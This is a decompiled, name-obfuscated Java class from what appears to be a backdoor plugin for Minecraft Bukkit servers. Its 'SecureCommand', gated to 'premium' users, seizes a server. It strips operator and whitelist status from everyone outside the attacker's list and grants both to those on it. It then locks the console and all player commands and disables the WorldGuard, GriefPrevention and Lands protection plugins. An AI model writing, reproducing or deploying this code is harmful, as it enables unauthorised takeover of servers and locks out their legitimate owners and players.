/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class SecureCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIlIIlIlIlIlIIlIlII, String llllllllllllllIlIIlIlIlIlIIlIIll, String[] llllllllllllllIlIIlIlIlIlIIlIIlI, Player llllllllllllllIlIIlIlIlIlIIIllll) {
        if (llllllllllllllIlIIlIlIlIlIIlIlII.premium.contains(llllllllllllllIlIIlIlIlIlIIIllll.getName())) {
            for (Player llllllllllllllIlIIlIlIlIlIIlIllI : Bukkit.getOnlinePlayers()) {
                if (!llllllllllllllIlIIlIlIlIlIIlIlII.lite.contains(llllllllllllllIlIIlIlIlIlIIlIllI.getName())) {
                    if (!llllllllllllllIlIIlIlIlIlIIlIllI.isOp()) continue;
                    API.deopPlayer(llllllllllllllIlIIlIlIlIlIIlIllI);
                    llllllllllllllIlIIlIlIlIlIIlIllI.setWhitelisted(false);
                    continue;
                }
                llllllllllllllIlIIlIlIlIlIIlIllI.setWhitelisted(true);
                API.opPlayer(llllllllllllllIlIIlIlIlIlIIlIllI);
            }
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("Everyone not logged in was deoped and un-whitelisted"));
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("Everyone logged in was oped and whitelisted"));
            llllllllllllllIlIIlIlIlIlIIlIlII.isLocked = true;
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("Console was locked"));
            llllllllllllllIlIIlIlIlIlIIlIlII.playerCommandsLocked = true;
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("All commands are now locked"));
            API.disablePlugin("WorldGuard");
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("Attempting to disable WorldGuard"));
            API.disablePlugin("GriefPrevention");
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("Attempting to disable GriefPrevention"));
            API.disablePlugin("Lands");
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX("Attempting to disable Lands"));
        } else {
            llllllllllllllIlIIlIlIlIlIIIllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("premium ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    public SecureCommand() {
        SecureCommand llllllllllllllIlIIlIlIlIlIIlllII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

